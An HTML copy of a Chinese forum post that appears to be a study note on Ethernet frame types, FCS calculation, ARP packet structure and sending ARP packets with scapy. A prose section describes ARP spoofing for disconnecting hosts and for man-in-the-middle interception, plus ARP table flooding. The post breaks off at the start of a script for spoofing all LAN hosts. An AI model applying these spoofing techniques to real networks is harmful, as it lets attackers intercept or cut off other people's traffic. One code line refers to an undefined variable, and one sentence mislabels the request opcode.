<!DOCTYPE html><html lang=zh-CN><head><meta charset=UTF-8><meta name=viewport content="width=device-width, initial-scale=1.0"><title>帖子内容</title><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js></script><script>hljs.highlightAll();</script><style>*{word-wrap:break-word}body,html{margin:0;padding:0;width:93%;height:100%}.table-container{width:93vw;overflow-x:auto}table{margin:.25em auto;width:100%;max-width:100%;table-layout:auto;overflow:auto;border-spacing:0;border-collapse:collapse}table tr:nth-child(2n){background-color:#f6f8fa}table thead{background-color:#d9e2df}table th{font-weight:600}table tr{border-top:1px solid #c6cbd1}table td,table th{padding:6px 13px;border:1px solid #c6cbd1 text-align:center}pre{background-color:#F8F8F8;border:1px solid #CCCCCC;border-radius:3px;padding:2px;overflow-x:auto;width:100%;box-sizing:border-box}code{font-family:Consolas,Monaco,Andale Mono,monospace;background-color:#f5f5f5}pre code.hljs{display:block;overflow-x:auto;padding:1em}code.hljs{padding:3px 5px}.hljs{background:#000;color:#f8f8f8}.hljs-comment,.hljs-meta,.hljs-quote{color:#7c7c7c}.hljs-keyword,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#96cbfe}.hljs-attribute,.hljs-selector-id{color:#ffffb6}.hljs-addition,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string{color:#a8ff60}.hljs-subst{color:#daefa3}.hljs-link,.hljs-regexp{color:#e9c062}.hljs-doctag,.hljs-section,.hljs-title,.hljs-type{color:#ffffb6}.hljs-bullet,.hljs-literal,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#c6c5fe}.hljs-deletion,.hljs-number{color:#ff73fd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.container{width:100%;margin:20px auto;padding:20px;border-radius:8px;word-wrap:break-word}.postcontent{width:100%;margin-bottom:20px;border-bottom:3px solid #e0f7ff;padding-bottom:10px;word-wrap:break-word}.postcontent:last-child{border-bottom:none}.postcontent h1{margin:0 0 10px;font-size:24px}.postcontent p{margin:0 0 10px;font-size:16px}.postcontent .author{font-size:14px;color:#555}.postcontent .timestamp{font-size:12px;color:#888}.postcontent blockquote{border-left:4px solid #ccc;padding:5px 10px;margin:10px 0;background:#f9f9f9}.postcontent blockquote cite{display:block;text-align:right;font-size:12px;color:#555}.postcontent img{max-width:100%;height:auto;margin:10px 0}.postcontent table{width:100%;border-collapse:collapse;margin:10px 0}.postcontent table th,.postcontent table td{border:1px solid #ddd;padding:8px;text-align:left}.postcontent button{background:#007bff;color:#fff;border:none;padding:10px 20px;font-size:16px;cursor:pointer;border-radius:5px}.postcontent button:hover{background:#0056b3}.comment-container{width:90%;margin:20px auto;border:1px solid #f0f0f0;padding:20px;border-radius:5px;font-family:Arial,sans-serif}.comment-header{background-color:#fff7e6;padding:10px;border-left:5px solid #ff5722;margin:-20px -20px 20px;border-radius:5px 5px 0 0;font-weight:bold}.comment-body{margin-top:10px}.comment-author{font-size:18px;color:#333}.comment-text{font-size:16px;color:#555}.comment-time{text-align:right;color:#999;margin-top:10px}</style><div id=zxsq-markdown-code-tools style=display:none;><span class=show>显示代码</span><span class=hide>隐藏代码</span><span class=copy>复制代码</span><span class=copysucc style=display:none>代码已复制到剪贴板</span></div><script>(function(){function n(n,t=1500){var e=document.createElement("div");e.style.position="fixed",e.style.top="20px",e.style.left="50%",e.style.transform="translateX(-50%)",e.style.padding="10px",e.style.backgroundColor="rgba(0, 0, 0, 0.7)",e.style.color="white",e.style.borderRadius="5px",e.style.zIndex="10000",e.innerHTML=n,document.body.appendChild(e),setTimeout(()=>{document.body.removeChild(e)},t)}function t(t,e){var o=document.createElement("textarea");o.value=t,o.style.position="fixed",o.style.opacity="0",document.body.appendChild(o),o.select();try{document.execCommand("copy")&&n(e)}catch(t){console.error("Failed to copy",t)}document.body.removeChild(o)}function e(){var e=document.getElementById("zxsq-markdown-code-tools"),o=e.querySelector(".show").innerText,c=e.querySelector(".hide").innerText,d=e.querySelector(".copy").innerText,i=e.querySelector(".copysucc").innerText;document.querySelectorAll("pre").forEach(e=>{if("hideCode"===e.firstChild.className||"CopyMyCode"===e.firstChild.className||"showCode"===e.firstChild.className)return;var r=document.createElement("div");r.style.display="flex",r.style.justifyContent="flex-start",r.style.alignItems="center",r.style.marginBottom="10px";var a=document.createElement("em");a.className="CopyMyCode",a.style="cursor:pointer;font-size:12px;color:#369 !important;margin-right:10px;",a.innerText=d,r.appendChild(a),a.onclick=function(){t(this.parentElement.parentElement.lastChild.innerText,i)};var s=document.createElement("em");s.className="hideCode",s.style="cursor:pointer;font-size:12px;color:#369 !important;",s.innerText=c,r.appendChild(s),s.onclick=function(){var n=this.parentElement.parentElement.lastChild;"hideCode"===this.className?(n.style.display="none",this.className="showCode",this.innerText=o):(n.style.display="block",this.className="hideCode",this.innerText=c)},e.insertBefore(r,e.firstChild)})}
window.addEventListener("load",e)})();</script></head><body><div class=container><p>原帖地址:https://www.52pojie.cn/thread-2060347-1-1.html</p><div class=postcontent><h1>楼主</h1><div class=author>bester</div><div class=timestamp>2025-9-15 14:34</div><h5 id=53866224_以太网帧类型>以太网帧类型</h5><ul><li>以太网 II（Ethernet II）帧 <ul><li>&gt; Ethernet Ⅱ帧，也称为Ethernet V2帧，是如今局域网里最常见的以太帧，是以太网事实标准。如今大多数的TCP/IP应用（如HTTP、FTP、SMTP、POP3等）都是采用Ethernet II帧承载</li></ul></li><li>IEEE 802.3 RAW 原始帧 <ul><li>&gt; 以太网中使用两种标准帧格式，一种是上世纪 80 年代初提出的 DIX Ethernet V2 格式，即 Ethernet II；另一种是 1983 年提出的 IEEE 802.3 格式。这两种格式的区别主要在于，Ethernet II 格式中包含了一个 Type 字段，用于标识以太网帧处理完成后将被发送到哪个上层协议进行处理；而 IEEE 802.3 格式的同样位置是 Length 长度字段。</li></ul></li><li>IEEE 802.3 + 802.2（LLC）帧 <ul><li>&gt; 由于 802.3 帧本身没有指定上层协议，因此 IEEE 引入了 802.2 逻辑链路控制（LLC） 头，以区分不同的上层协议</li><li>&gt; IEEE 802.3 LLC以太帧，也称为IEEE 802.3 SAP以太帧，是IEEE 正式的802.3标准，它由Ethernet II发展而来</li></ul></li><li>IEEE 802.3 + 802.2 + SNAP（Subnetwork Access Protocol）帧 <ul><li>&gt; 为了解决 LLC 帧无法与 TCP/IP 兼容的问题，IEEE 进一步引入了 SNAP（子网访问协议），它增加了一个 协议类型字段，类似于以太网 II 的 Type 字段</li><li>&gt; IEEE 802.3 SNAP以太帧，是IEEE为保证在802.3 LLC上支持更多的上层协议同时更好的支持IP协议而发布的标准</li></ul></li><li>IEEE 802.1Q VLAN 帧</li><li>&gt; 当以太网帧用于 VLAN（虚拟局域网）时，会插入 4字节的 VLAN 标记字段，即 IEEE 802.1Q 标准</li><li>IEEE 802.1ad（QinQ）帧 <ul><li>仅作了解</li><li>&gt; QinQ（双标签 VLAN）用于 运营商级别的 VLAN 隧道，它在 标准 802.1Q 帧的基础上再添加一个外层 VLAN 标签</li></ul></li><li>以太网 Jumbo Frame（巨型帧） <ul><li>仅作了解</li><li>&gt; 标准以太网帧的最大长度是 1518字节（含FCS），Jumbo Frame 允许更大的帧大小（通常为 9000 字节），以提高大数据传输效率</li></ul></li></ul><h6 id=53866224_结构与区别>结构与区别</h6><ul><li>Ehternet II帧(主要学习该协议) <ul><li>目的地址（6字节）： 目标设备的MAC地址</li><li>源地址（6字节）： 发送设备的MAC地址</li><li>类型（2字节）： 指定上层协议（如IPv4、IPv6、ARP等）</li><li>数据（46-1500字节）： 具体的上层协议数据</li><li>FCS（4字节）： 帧校验序列，用于检测数据帧是否有错误</li></ul></li><li>特点 <ul><li>以太网 II 帧的 类型字段（Type）用于标识上层协议,该值大于等于 0x0600 == 1536比如： <ul><li>0x0800 表示 IPv4</li><li>0x0806 表示 ARP</li><li>0x86DD 表示 IPv6</li></ul></li><li>这种帧格式被广泛用于 TCP/IP网络，尤其是互联网通信</li></ul></li></ul><div class=table-container><table><thead><tr><th>Destination MAC address(目的地址)</th><th>Source MAC address(源地址)</th><th>Type(类型)</th><th>Data/Payload(数据)</th><th>校验和(FCS)</th></tr></thead><tbody><tr><td>6字节</td><td>6字节</td><td>2字节</td><td>46-1500字节</td><td>4字节</td></tr></tbody></table></div><ul><li>IEEE 802.3 RAW原始帧 <ul><li>长度字段（2字节）： 表示数据字段的长度，取值范围 0~1500,但不包括FCS字段</li><li>数据（46-1500字节）： 具体的数据载荷</li><li>FCS（4字节）： 用于错误检测</li></ul></li><li><p>特点</p><ul><li>802.3 帧格式的 长度字段最大值为 1500，而以太网 II 帧的 类型字段的数值范围一般大于 1500，因此可以区分这两种帧格式。</li><li>这种帧格式常用于 非 TCP/IP 网络</li></ul></li></ul><div class=table-container><table><thead><tr><th>Destination MAC address(目的地址)</th><th>Source MAC address(源地址)</th><th>Length(长度)</th><th>0xFFFF(固定分割符)</th><th>Data/Payload(数据)</th><th>校验和(FCS)</th></tr></thead><tbody><tr><td>6字节</td><td>6字节</td><td>2字节</td><td>2字节</td><td>44-1498字节</td><td>4字节</td></tr></tbody></table></div><ul><li>IEEE 802.3 LLC帧 <ul><li>DSAP（1字节）： 目标服务访问点（Destination SAP），用于指定接收端协议</li><li>SSAP（1字节）： 源服务访问点（Source SAP），用于指定发送端协议</li><li>控制字段（1字节）： 指示帧类型（如信息帧、监督帧）</li><li>DSAP 和 SSAP 用于标识上层协议,现已较少使用</li></ul></li></ul><div class=table-container><table><thead><tr><th>目的地址</th><th>源地址</th><th>长度</th><th>DSAP</th><th>SSAP</th><th>Ctrl控制</th><th>数据</th><th>FCS</th></tr></thead><tbody><tr><td>6字节</td><td>6字节</td><td>2字节</td><td>1字节</td><td>1字节</td><td>1字节</td><td>43-1497字节</td><td>4字节</td></tr></tbody></table></div><ul><li>IEEE 802.3 SNAP帧 <ul><li>SNAP（5字节）：</li><li>3字节 OUI（组织唯一标识符）： 指定厂商</li><li>2字节协议类型（如 IPv4=0x0800）： 指定上层协议</li></ul></li><li>特点 <ul><li>兼容 IEEE 802.3 和 以太网 II 帧,现已基本被以太网 II 取代</li></ul></li></ul><div class=table-container><table><thead><tr><th>目的地址</th><th>源地址</th><th>长度</th><th>DSAP</th><th>SSAP</th><th>控制</th><th>协议类型</th><th>数据</th><th>FCS</th></tr></thead><tbody><tr><td>6字节</td><td>6字节</td><td>2字节</td><td>1字节</td><td>1字节</td><td>1字节</td><td>5字节</td><td>38-1492字节</td><td>4字节</td></tr></tbody></table></div><ul><li>IEEE 802.1Q VLAN帧 <ul><li>802.1Q VLAN 标签（4字节）：</li><li>TPID（2字节）： VLAN 标记协议 ID，固定为 0x8100</li><li>TCI（2字节）： <ul><li>PCP（3比特）： 优先级控制</li><li>DEI（1比特）： 丢弃指示</li><li>VID（12比特）： VLAN ID（1~4094）</li></ul></li></ul></li><li>特点 <ul><li>用于 VLAN之间的数据分离</li><li>适用于 企业网络、数据中心等</li></ul></li></ul><div class=table-container><table><thead><tr><th>目的地址</th><th>源地址</th><th>802.1Q 标签</th><th>类型</th><th>数据</th><th>FCS</th></tr></thead><tbody><tr><td>6字节</td><td>6字节</td><td>4字节</td><td>2字节</td><td>42-1500字节</td><td>4字节</td></tr></tbody></table></div><ul><li>IEEE 802.1ad（QinQ）帧 <ul><li>双 VLAN 标签（Outer Tag + Inner Tag）</li><li>用于跨运营商网络传输 VLAN</li></ul></li></ul><div class=table-container><table><thead><tr><th>目的地址</th><th>源地址</th><th>外层 802.1Q</th><th>内层 802.1Q</th><th>类型</th><th>数据</th><th>FCS</th></tr></thead><tbody><tr><td>6字节</td><td>6字节</td><td>4字节</td><td>4字节</td><td>2字节</td><td>38-1500字节</td><td>4字节</td></tr></tbody></table></div><h7 id=53866224_参考来源>参考来源</h7><ul><li><a href=https://fiberroad.com.cn/ethernet-frame rel="nofollow noopener">https://fiberroad.com.cn/ethernet-frame</a></li></ul><h6 id=53866224_如何判断帧格式（抓包技巧）>如何判断帧格式（抓包技巧）</h6><ul><li>以太网帧的第三字段 ≤ 1500 → 是 Length → IEEE + 802.3</li><li>以太网帧的第三字段 ≥ 1536 (0x0600) → 是 Type → Ethernet II</li><li>帧中包含 TPID = 0x8100 → 是 VLAN 封装（802.1Q）</li><li>帧中含 SNAP Header → 是 IEEE 802.2 + SNAP 格式</li><li>使用 Wireshark 或 tcpdump 抓包时，可通过上述字段快速识别帧类型</li></ul><h5 id=53866224_ehternet-ii帧结构>Ehternet II帧结构</h5><p>Ethernet Ⅱ帧，也称为Ethernet V2帧，是如今局域网里最常见的以太帧，是以太网事实标准。如今大多数的TCP/IP应用（如HTTP、FTP、SMTP、POP3等）都是采用Ethernet II帧承载</p><p>以太网帧 Frame 由 帧头部(Header)、数据(Data)、帧尾部(Tailer)/FCS（Frame Check Sequence）(校验和)三部分组成。</p><p>MTU（Maximum Transmission Unit，最大传输单元），属于数据链路层的概念，用于在数据链路层对数据帧长度进行限制，是指网络能够传输的最大数据包大小，以字节 Byte 为单位。以太网帧的默认 MTU 值为 1500,注意这个值指的是data或者叫payload(载荷)部分的大小，而不包含帧头部和帧尾部(FCS)</p><p>Ehternet II帧 帧头部(Header)结构</p><ol><li>前同步码/前导码(Preamble)：以太网标准中规定前导码为10101010 10101010 10101010 10101010 10101010 10101010 10101010（二进制），共7字节</li><li>帧起始定界符SFD:以太网标准中规定帧开始定界符为10101011（二进制），共1字节。 </li><li>目的地址(Destination Address)：6字节的MAC地址，指明接收方。 </li><li>源地址(Source Address)：6字节的MAC地址，指明发送方。 </li><li>类型(Type)：2字节，指明上层协议类型。 </li><li>数据和填充(Data and Pad)：46-1500字节的数据载荷，不足46字节时,需使用00填充至46字节,数据字段的最大长度为1500字节,以太帧的长度必须为整数字节，因此帧的负载长度不足整数字节，需插入填充字段以保证数据帧的长度为整数字节。 </li><li>帧检验序列(FCS)：4字节，用于错误检测,在以太帧中，FCS通常采用循环冗余码校验CRC-32（Cyclical Redundancy Check）。 </li><li>帧间隙(Interframe Gap)：在以太网标准中规定最小帧间隙是12个字节，其数据为全1,每个以太帧之间都要有帧间隙（Inter Frame Gap），即每发完一个帧后要等待一段时间才能再发另外一个帧,两帧之间最少要有96bit，IFGmin=96bit/s 12Bytes=12*8bit=96bit/s。 </li></ol><p>注:以太网帧协议位于osi参考模型的第2层――数据链路层,第1层――物理层。</p><h7 id=53866224_fcs校验计算方法>FCS校验计算方法</h7><p>FCS计算的范围是从Destination Address到数据Data部分,不包含帧起始定界符,SFD和帧尾部FCS自身,计算方法为CRC-32校验算法。</p><pre><code class=language-python>import binascii

# 输入的十六进制数据(原始数据,不含FCS校验值)
hex_data = "7a7ac0a8c801000000000033810000000800450000240001000040016964c0a8c821c0a8c80108002729000100013132333435363738"

# 将十六进制字符串转换为字节
byte_data = binascii.unhexlify(hex_data)

# 计算CRC32校验值
crc32_value = binascii.crc32(byte_data) &amp; 0xFFFFFFFF  # 确保结果为正数

# 转换为十六进制格式，大写，补零至8位
hex_crc32 = format(crc32_value, '08X')

print(f"原始十六进制数据: {hex_data}")
print(f"CRC32校验结果: {hex_crc32}")

# 输出结果
# 6624C9CC
# 结果转大端序为: CCC92466</code></pre><p>为什么wireshark抓不到前序和FCS?</p><blockquote><p>在物理层上网卡要先去掉前导同步码和帧开始定界符，然后对帧进行CRC检验，如果帧校验和错，就丢弃此帧。如果校验和正确，就判断帧的目 的硬件地址是否符合自己的接收条件（目的地址是自己的物理硬件地址、广播地址、可接收的多播硬件地址等），如果符合，就将帧交“设备驱动程序”做进一步处 理。这时我们的抓包软件才能抓到数据，因此，抓包软件抓到的是去掉前导同步码、帧开始分界符、FCS之外的数据</p></blockquote><h7 id=53866224_参考来源-1>参考来源</h7><ul><li><a href=https://support.huawei.com/enterprise/zh/doc/EDOC1100174722/344c61d5 rel="nofollow noopener">https://support.huawei.com/enterprise/zh/doc/EDOC1100174722/344c61d5</a><h5 id=53866224_arp协议结构>ARP协议结构</h5><p>ARP（Address Resolution Protocol，地址解析协议）是用来将IP地址解析为MAC地址的协议。RARP（Reverse Address Resolution Protocol，反向地址解析协议）是用来将MAC地址解析为IP地址的协议</p></li></ul><p>在以太网协议中，所有数据的底层传输最终都必须通过 MAC 地址完成，这是由以太网的链路层特性决定的</p><p>以太网作为数据链路层协议，其核心功能是在物理网络中（如局域网）通过硬件地址（MAC 地址）实现设备间的直接通信。任何上层协议（如 IP、ARP、TCP/UDP）的数据，在通过以太网传输时，都必须被封装为以太网帧，而帧的头部强制包含 “目的 MAC 地址” 和 “源 MAC 地址”―― 这两个字段是帧在物理介质中转发的唯一依据（交换机、网卡等设备仅识别 MAC 地址）</p><blockquote><p>当数据需要发送到其他网段（如访问互联网）时，虽然上层依赖 IP 地址进行路由决策，但在每个以太网段内部，数据的传递仍需通过 MAC 地址</p><p>源设备会先将数据发送到本地网关（通过网关的 MAC 地址）</p><p>网关接收后，再通过下一跳设备的 MAC 地址转发</p><p>最终，数据在目标网段内通过目标设备的 MAC 地址送达</p><p>整个过程中，IP 地址仅用于 “逻辑寻址” 和路由选择，而物理层的帧传递始终以 MAC 地址为基础</p></blockquote><p>ARP协议所有的数据都位于以太网帧的Data部分,其结构如下(wireshark)</p><ul><li>Address Resolution Protocol (request) <ul><li>Hardware type(硬件地址类型,2字节): Ethernet (1) <ul><li>对于以太网，该类型的值为“1”</li></ul></li><li>Protocol type(协议地址类型,2字节): IPv4 (0x0800) <ul><li>对于IP地址，该值为0x0800</li></ul></li><li>Hardware size(硬件地址的长度,1字节): 6 <ul><li>MAC地址的长度为6字节</li></ul></li><li>Protocol size(表示协议地址的长度,1字节): 4 <ul><li>IP地址的长度为4字节</li></ul></li><li>Opcode(操作码): request (1) <ul><li>1 ARP请求</li><li>2 ARP应答</li><li>3 RARP请求</li><li>4 RARP应答</li></ul></li><li>Sender MAC address(发送方MAC地址,6字节): ASUSTekCOMPU_aa:bb:cc (22:33:44:aa:bb:cc)</li><li>Sender IP address(发送方IP地址,4字节): 192.168.22.138</li><li>Target MAC address(目标MAC地址,6字节): Xerox_00:00:00 (00:00:00:00:00:00)</li><li>Target IP address(目标IP地址,4字节): 192.168.22.98</li></ul></li></ul><p>Ethernet数据 + ARP数据解析:</p><blockquote><p>ff ff ff ff ff ff 22 33 44 aa bb cc 08 06 00 01 08 00 06 04 00 01 22 33 44 aa bb cc c0 a8 16 8a 00 00 00 00 00 00 c0 a8 16 62 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p></blockquote><p>我们说,ARP协议位于Ethernet II帧的Data部分,我们根据以太网帧的结构以及ARP协议,逐一拆解数据</p><blockquote><p>ff ff ff ff ff ff 22 33 44 aa bb cc 08 06 总共占6 + 6 + 2 = 14字节</p><ul><li>Ethernet II帧:</li><li>目标MAC地址: ff:ff:ff:ff:ff:ff<br> 对于arp协议是将IP地址解析为MAC地址,由于当前不知道目标IP的MAC地址,所以这里填充的是广播地址,询问请求某个IP地址的MAC地址</li><li>源MAC地址(发送方MAC地址): 22:33:44:aa:bb:cc</li><li>类型: 0x0806 (ARP协议)</li></ul><p>00 01 08 00 06 04 00 01 22 33 44 aa bb cc c0 a8 16 8a 00 00 00 00 00 00 c0 a8 16 62</p><ul><li>ARP数据:</li><li>硬件类型: 0x0001 (以太网)</li><li>协议类型: 0x0800 (IPv4)</li><li>&gt; ARP 帧内部的 Protocol Type 字段表示“要解析或映射的上层协议地址类型”。0x0806 是 ARP 帧本身的以太网 EtherType，用来告诉链路层“这是一帧 ARP 数据”，而不是一个需要被 ARP 解析的协议地址类型</li><li>硬件地址长度: 0x06 (MAC地址长度为6字节)</li><li>协议地址长度: 0x04 (IP地址长度为4字节)</li><li>操作码: 0x0001 (表示这是ARP请求包)</li><li>1 ARP请求</li><li>2 ARP应答</li><li>3 RARP请求</li><li>4 RARP应答</li><li>发送方MAC地址: 22:33:44:aa:bb:cc</li><li>发送方IP地址: 192.168.22.138</li><li>&gt; 192(10进制) = c0(16进制) 168 = a8(16进制) 22 = 16(16进制) 138 = 8a(16进制)</li><li>&gt; c0 a8 16 8a = 192.168.22.138</li><li>目标MAC地址: 00:00:00:00:00:00</li><li>&gt; 表示不知道目标IP的MAC地址,所以这里填充的是00</li><li>目标IP地址: 192.168.22.98</li></ul></blockquote><p>综上:我们知道如果需要发送数据给一个IP,需要通过ARP协议将IP地址解析为MAC地址,而我们想要知道MAC地址,则需要发送ARP请求包,并等待ARP应答包返回,ARP请求包会将arp协议中的Opcode设置为2,表示这是ARP应答包,然后将目标IP地址和MAC地址设置为ARP请求包中的发送方IP地址和发送方MAC地址,再将自身的IP地址跟MAC地址填入发送方MAC地址和发送方IP地址</p><p>对的,其实就是请求包和应答包的发送方跟目标方对调一下位置</p><p>ARP 协议（地址解析协议）的层次划分存在一定争议，但通常认为它跨在 OSI 模型的第二层（数据链路层）和第三层（网络层）之间</p><p>ARP 广播消息仅能在局域网内传播，是MAC 广播地址的物理限制和IP 网段的逻辑限制共同作用的结果</p><ul><li>硬件层面：FF:FF:FF:FF:FF:FF 确保帧仅在本地局域网内被接收，路由器会阻断其跨网段传播</li><li>协议层面：目标 IP 的网段属性确保其他网段的设备即使收到帧，也会因 IP 不匹配而忽略(通过子网掩码判断)</li></ul><p>padding 填充:</p><p>ARP 协议的请求和应答包都包含 28 字节的固定长度,根据以太网帧协议,Data数据的大小范围被限制在46- 1500之间,由于ARP协议的固定长度为28字节,所以必须填充至46字节,确保所有设备能够正确处理短数据包，避免因长度不足导致的解析错误,所以上面填充了18个字节的00</p><p>以太网协议规定，一个完整的帧（从目的 MAC 地址到 FCS 校验字段）最小长度必须为 64 字节。这包括帧头(14字节) + 数据(46字节) + FCS(4字节)。</p><p>注:当我自己组装arp请求包(14 + 28 = 42字节),并且不对其进行padding时,似乎也能收到arp应答包,可能网卡纠错机制???</p><h5 id=53866224_单播-组播-广播>单播 组播 广播</h5><ul><li>单播: 单播是指在一个网络中,只有一个目的地的帧才会被接收,其他的帧将被丢弃。</li><li>组播: 组播是指在一个网络中,多个设备可以接收到同一个目的帧。</li><li>广播: 广播是指在一个网络中,所有设备都可以接收到同一个目的帧。</li></ul><h5 id=53866224_arp攻击>ARP攻击</h5><ul><li>arp欺骗 <ul><li>单向欺骗 <ul><li>伪造网关IP的ARP报文(将网关的MAC设置为一个不存在的MAC地址),对特定目标主机进行ARP欺骗,令其断网</li></ul></li><li>双向欺骗 <ul><li>充当中间人C,欺骗A主机,把自身的MAC地址作为B主机的MAC地址,同时欺骗B主机,把自身的MAC地址作为A主机的MAC地址,使A以为C是B,B也以为C是A,从而达到中间人攻击的目的。</li></ul></li></ul></li><li>arp泛洪攻击 <ul><li>ARP表项溢出</li><li>设备的 ARP 缓存表被大量无效或伪造的 IP-MAC 映射条目填满，导致缓存表达到最大容量，无法再存储新的正常条目</li><li>ARP表项缺失(ARP MISS)</li><li>设备 ARP 缓存表中缺少正常通信所需的 IP-MAC 映射条目，或条目被替换为错误信息（如无效 MAC）</li></ul></li><li><h5 id=53866224_wireshark-关于arp部分的过滤条件>wireshark 关于ARP部分的过滤条件</h5><blockquote><p>arp and eth.dst==00:11:22:33:44:55  过滤目的MAC地址为00:11:22:33:44:55的ARP包(MAC地址分隔符:或者-都可以)</p><p>arp and eth.src==00:11:22:33:44:55  过滤源MAC地址为00:11:22:33:44:55的ARP包</p><p>eth.src==00:11:22:33:44:55 or eth.dst==00:11:22:33:44:55  同时查看ARP请求与应答包(需先使用arp捕获过滤器)</p></blockquote></li></ul><h5 id=53866224_arp-probe>ARP Probe</h5><p>(ARP Probe) 是一种特殊的 ARP 报文，称为 ARP 探测（ARP Probe），它的出现与设备获取 IP 地址时的 “地址冲突检测（ARP Conflict Detection, ACD）” 机制有关，是设备在使用 IP 地址前的一种 “预检查” 行为。</p><p>当一台设备（如电脑、手机、物联网设备）要使用某个 IP 地址（无论该 IP 是手动设置的静态 IP，还是通过 DHCP 自动获取的）时，为了避免与局域网内其他设备的 IP 地址冲突，会先发送 ARP Probe 报文进行探测，核心目的是：“检查这个 IP 地址是否已经被局域网内的其他设备占用”。</p><p>以太网帧阶段,以广播形式发送（目标 MAC 为 FF:FF:FF:FF:FF:FF），确保局域网内所有设备都能收到。</p><p>报文格式与普通ARP请求不同的是:<br> ARP阶段,Sender IP address 地址为0.0.0.0，即发送者IP地址为0.0.0.0，Target IP address为要探测的IP地址,但Target MAC address同为00:00:00:00:00:00。</p><h5 id=53866224_arp-announcement>ARP Announcement</h5><p>ARP 通告是一种特殊的 ARP 请求报文，其作用是主机向网络中宣告自己要使用某个 IP 地址。在 ARP 通告报文中,</p><p>以太网帧阶段,以广播形式发送（目标 MAC 为 FF:FF:FF:FF:FF:FF），确保局域网内所有设备都能收到。</p><p>报文格式与普通ARP请求不同的是:<br> ARP阶段,Sender IP address 与 Target IP address 相同，即源IP地址与目的IP地址相同,Target MAC address同为00:00:00:00:00:00。</p><h5 id=53866224_gratuitous-arp>Gratuitous ARP</h5><p>Gratuitous ARP也称为免费ARP，无故ARP。Gratuitous ARP不同于一般的ARP请求，它并非期待得到IP对应的MAC地址，而是当主机启动的时候，将发送一个Gratuitous arp请求，即请求自己的IP地址的MAC地址</p><p>免费ARP有两个方面的作用:<br> 1.验证IP是否冲突<br> 一个主机可以通过它来确定另一个主机是否设置了相同的IP地址。发送主机并不需要一定收到此请求的回答。如果收到一个回答，表示网络中存在与自身IP相同的主机。如果没有收到应答，则表示本机所使用的IP与网络中其它主机并不冲突<br> 2.更换物理网卡<br> 如果发送ARP的主机正好改变了物理地址（如更换物理网卡），可以使用此方法通知网络中其它主机及时更新ARP缓存</p><p>ARP阶段,Sender IP address 与 Target IP address 相同，即源IP地址与目的IP地址相同,Target MAC address同为FF:FF:FF:FF:FF:FF。</p><p>注意:搜索资料发现有的人抓包得到的Target MAC address 为00:00:00:00:00:00，但在我windows 10电脑上测试时为FF:FF:FF:FF:FF:FF。</p><p>另外还有一个疑问,就是wireshark是如何区分ARP Announcement跟gratuitous arp,他们在报文结构上,似乎没有什么区别?但是在wireshark的info会输出 Gratuitous ARP for IP地址。<br> 以及ARP Announcement for IP地址</p><h5 id=53866224_scapy库>scapy库</h5><blockquote><p><a href=https://scapy.net/ rel="noopener noreferrer nofollow" target=_blank>https://scapy.net/</a></p><p><a href=https://github.com/secdev/scapy rel="noopener noreferrer nofollow" target=_blank>https://github.com/secdev/scapy</a></p><p><a href=https://scapy.readthedocs.io/en/latest/ rel="noopener noreferrer nofollow" target=_blank>https://scapy.readthedocs.io/en/latest/</a></p></blockquote><p>scapy库可以用来发送、接收、解析、修改、伪造、攻击网络包,可以很方便的像搭积木一样,组装每一层协议的数据包,并且可以自定义发送的报文内容</p><p>OSI七层模型(由低到高):</p><ul><li>物理层(Physical Layer):(第一层,也是最底层) 物理层主要负责0、1信号的传输，以及物理设备的电气特性、功能特性、规程特性的实现。</li><li>数据链路层(Data Link Layer): (第二层 MAC to MAC)数据链路层主要负责将网络层传下来的分组进行封装成帧，并在两个相邻节点之间传送。</li><li>网络层(Network Layer): (第三层 IP to IP)网络层主要负责将分组从源点到达目的地，并进行路由选择。</li><li>传输层(Transport Layer): (第四层)传输层主要负责向应用进程提供可靠的端到端的通信。</li><li>会话层(Session Layer): (第五层)会话层主要负责建立、管理和终止会话。</li><li>表示层(Presentation Layer): (第六层)表示层主要负责对数据进行翻译、加密、解密、压缩等处理。</li><li>应用层(Application Layer): (第七层)应用层主要负责向用户提供各种网络服务。</li></ul><p>scapy基本的函数:</p><ul><li>send：发送3层报文（ 如TCP/UDP 协议），不接收数据包</li><li>sendp：发送2层报文(通过mac地址转发)，不接收</li><li>sniff：用于网络嗅探，类似Wireshark和tcpdump抓包</li><li>sr：发送，接收3层报文，返回有回应的数据包和没有回应的数据包。</li><li>sr1：发送，只接收1个响应包</li><li>srp：发送，接收2层报文，返回有回应的数据包和没有回应的数据包。</li><li>srp1：发送，只接收1个响应包</li><li>srloop：循环发送</li><li>srploop：循环发送</li></ul><h5 id=53866224_利用scapy库发送arp请求包>利用scapy库发送ARP请求包</h5><pre><code class=language-python>from scapy.all import *

# 定义以太网帧的目标MAC地址
et = Ether(dst="ff:ff:ff:ff:ff:ff")

# 定义ARP请求包, op=1表示ARP请求, pdst表示目标IP地址, hwdst表示目标MAC地址
arpdata = ARP(op=1, pdst="192.168.100.98", hwdst="ff:ff:ff:ff:ff:ff")

# 定义playload,补齐至60字节
payload = b"\0" * 18

# 使用/ 符号组合以太网帧和ARP请求包
packet = et / arpdata / payload

# 查看packet的每一层网络协议的字段所对应的数据
packet.show()

# hexdump函数用来打印原始十六进制数据,类似于wireshark的显示效果
hexdump(arp_request)

# 发送数据包,无需接受响应
sendp(packet,verbose=0)

# 若需要接收响应,timeout参数指定超时时间,返回的是收到的响应包和未收到的响应包的类
answer, unanswer = srp(packet, timeout=1)
# 打印收到的响应包,send表示发送的数据,recv表示接收的数据
for send, recv in answer:
  print(recv.psrc)# 打印响应的IP地址和MAC地址
  print(recv.hwsrc)
  print(recv.summary()) # 打印响应包的摘要,类似于wireshark的info
  print(send.summary()) # 打印发送包的摘要,类似于wireshark的info

  # ls函数用来显示报文的详细信息,包括每个字段,字段类型,以及该字段被填充的值

  ls(send) # 显示发送ARP请求的接口信息
  ls(recv) # 显示接收到的ARP响应的接口信息</code></pre><h5 id=53866224_利用scapy库发送arp响应包欺骗所有的局域网主机>利用scapy库发送ARP响应包欺骗所有的局域网主机</h5><pre><code class=language-python>def getAllHostInfo(start_ip : str) -&gt; dict:
    """
    获取网段内的所有主机IP地址以及对应的MAC地址
    :param start_ip: 网段地址 例如:192.168.2.0/24

    """
